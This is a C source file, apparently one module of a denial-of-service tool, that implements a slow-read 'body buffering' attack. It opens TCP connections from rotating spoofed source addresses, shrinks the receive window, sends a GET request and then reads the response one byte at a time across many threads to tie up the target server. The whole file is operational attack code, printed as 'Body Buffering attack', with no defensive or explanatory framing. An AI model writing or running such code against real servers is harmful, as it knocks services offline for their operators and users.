#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/body_buffering.h"

#define GET_METHOD "GET /Force.mp3 HTTP/1.1\r\nHost: localhost\r\n\r\n"

#define RESPONSE_BUFFERING_CNT 50

extern int g_num_threads;

// session counting
__u64 g_resbuf_num_total;
__u64 g_resbuf_num_generated_in_sec;
// from main()
InputArguments g_resbuf_input;
__u32 g_resbuf_request_per_sec;
// for masking next ip address
MaskingArguments g_resbuf_now;
// thread
pthread_mutex_t g_resbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_resbuf_before_time;
struct timespec g_resbuf_now_time;

void response_buffering_print_usage(void)
{
	printf(
			"response buffering Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_response_buffering(void *data)
{
	int thread_id = *((int*) data);
	// making tcp connection
	int sock = -1;
	int src_port, seq, ack;

	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(g_resbuf_input.dest);
	servaddr.sin_port = htons(g_resbuf_input.port_start);
	int response_buffering_cnt = 0;
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_resbuf_mutex);
		// get now resource
		get_masking_arguments(&g_resbuf_input, &g_resbuf_now);
		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
			/*
			 if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
			 perror("sock creation failed\n");
			 }
			 if (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
			 perror("connect failed\n");
			 }*/
			int rvsz = 2;
			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz,
					sizeof(rvsz));
			rvsz = 1;
			setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&rvsz, sizeof(rvsz));

			sock = tcp_make_connection(
					inet_addr(g_resbuf_now.src),
					inet_addr(g_resbuf_now.dest),
					&src_port,
					g_resbuf_now.port,
					&seq,
					&ack,
					5000);

			char http_request[] = GET_METHOD;
			/*if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
			 perror("get send err\n");
			 }*/
			tcp_socket_send_data(
					sock,
					inet_addr(g_resbuf_now.src),
					inet_addr(g_resbuf_now.dest),
					src_port,
					g_resbuf_now.port,
					GET_METHOD,
					strlen(GET_METHOD),
					seq,
					ack,
					2);
			response_buffering_cnt = 0;

			fcntl(sock, F_SETFL, O_NONBLOCK);
		}
		// wait a second
		if (g_resbuf_num_generated_in_sec >= g_resbuf_request_per_sec) {
			pthread_cond_wait(&g_resbuf_cond, &g_resbuf_mutex);
		}
		// time checking
		time_check(
				&g_resbuf_cond,
				&g_resbuf_before_time,
				&g_resbuf_now_time,
				&g_resbuf_num_generated_in_sec);
		// read a character
		char buffer[2];
		int recv_size = -1;
		int sockaddrlen = sizeof(struct sockaddr_in);
		recv_size = recvfrom(sock, buffer, 1, 0, NULL, &sockaddrlen);
		if (recv_size == -1) {
			printf("no recv!\n");
		}
		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now.src),
				inet_addr(g_resbuf_now.dest), src_port,
				g_resbuf_now.port, seq, ack);*/
		ack++;
		printf("Read : %c\n", buffer[0]);
		g_resbuf_num_generated_in_sec++;
		g_resbuf_num_total++;
		response_buffering_cnt++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_resbuf_mutex);
	}
	close(sock);
	return NULL;
}

void *response_buffering_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_resbuf_mutex);
		time_check(
				&g_resbuf_cond,
				&g_resbuf_before_time,
				&g_resbuf_now_time,
				&g_resbuf_num_generated_in_sec);
		pthread_mutex_unlock(&g_resbuf_mutex);
	}
	return NULL;
}

void response_buffering_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		response_buffering_print_usage();
		return;
	}
	argv_to_input_arguments(argv, &g_resbuf_input);
	g_resbuf_num_generated_in_sec = 0;
	g_resbuf_num_total = 0;
	memset(&g_resbuf_before_time, 0, sizeof(struct timespec));
	memset(&g_resbuf_now_time, 0, sizeof(struct timespec));
	g_resbuf_request_per_sec = atoi(argv[3]);
	if (g_resbuf_request_per_sec == 0)
		g_resbuf_request_per_sec = __UINT_MAXIMUM__;
	const int num_threads = g_num_threads;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Body Buffering attack to %s using %d threads\n", g_resbuf_input.dest,
			num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_response_buffering,
				(void*) &thread_ids[i]);
		/*RECEIVE THREAD DEACTIVATION*/
		// pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
	}
	pthread_create(&threads[i], NULL, response_buffering_time_check,
			(void*) &thread_ids[i]);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	pthread_mutex_destroy(&g_resbuf_mutex);
	printf("Body Buffering attack finished.\n");
	pthread_exit(NULL);
	return;
}
